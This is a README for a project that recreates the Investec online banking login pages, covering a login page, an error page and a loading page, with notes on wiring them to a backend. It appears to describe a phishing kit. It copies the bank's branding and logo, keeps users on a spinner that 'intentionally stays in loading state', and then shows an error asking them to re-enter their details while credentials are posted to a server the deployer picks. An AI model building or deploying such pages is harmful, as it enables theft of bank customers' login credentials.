# Investec Login Pages

A pixel-perfect recreation of the Investec online banking login interface with form validation and loading states.

## Pages

### 1. **index.html** - Main Login Page
- Default login page with form validation
- Real-time input validation
- Green borders on filled inputs
- Red error messages on empty required fields
- "Remember my Investec ID" functionality
- Button enabled only when both inputs are filled

### 2. **error.html** - Login Error Page
- Same as index.html but displays an error alert at the top
- Shows message: "Login Failed - Please enter correct information"
- Used to redirect users back after failed login attempt

### 3. **loading.html** - Loading/Verification Page
- Displays animated circular spinner
- Shows "Verifying your information" message
- This page stays in loading state (does not auto-redirect)
- Can be used while backend processes authentication

## Form Flow

```
index.html (Login Form)
    ↓
  [User fills both inputs]
    ↓
  [Clicks "Log in"]
    ↓
loading.html (Stays here - implement backend redirect as needed)
```

## Features

✅ **Form Validation**
- Both inputs required
- Real-time validation on blur
- Dynamic button enable/disable
- Visual feedback (green/red borders)

✅ **User Experience**
- Animated floating labels
- Show/hide password toggle
- Remember me functionality (localStorage)
- Smooth transitions and animations

✅ **Cross-Browser Support**
- Safari (macOS & iOS)
- Chrome, Firefox, Edge
- Vendor prefixes included
- Responsive design (mobile, tablet, desktop)

✅ **Accessibility**
- ARIA labels and roles
- Semantic HTML
- Keyboard navigation support
- Screen reader compatible

## Files Structure

```
├── index.html           # Main login page
├── error.html           # Error state page
├── loading.html         # Loading/verification page
├── styles.css           # Main stylesheet
├── loading.css          # Loading page stylesheet
├── script.js            # Main page JavaScript
├── error-script.js      # Error page JavaScript
├── investiclogo.png     # Investec logo
├── icon.png             # Favicon
└── backgound.jpg        # Background image
```

## Backend Integration

To integrate with your backend:

1. **Form Submission**: Update the form action in `index.html` and `error.html`
2. **Authentication**: Process credentials on `loading.html` server-side
3. **Success**: Redirect from loading to dashboard
4. **Failure**: Redirect from loading to `error.html`

Example server-side flow:
```
POST /login → loading.html → 
    Success: redirect to /dashboard
    Failure: redirect to error.html
```

## Customization

### Colors
- Primary: `#3d4f5c` (Dark blue-gray)
- Success: `#4a9b4d` (Green)
- Error: `#dc2626` (Red)
- Background: Replace `backgound.jpg`

### Logo
Replace `investiclogo.png` with your logo image

### Text
Edit HTML files to change any text content

## Browser Support

- Chrome 60+
- Safari 12+
- Firefox 60+
- Edge 79+
- iOS Safari 12+
- Chrome for Android

## Notes

- The loading page intentionally stays in loading state
- Implement backend redirect logic for actual authentication flow
- Form data is logged to console (remove in production)
- Remember Me uses localStorage (not secure for production without encryption)
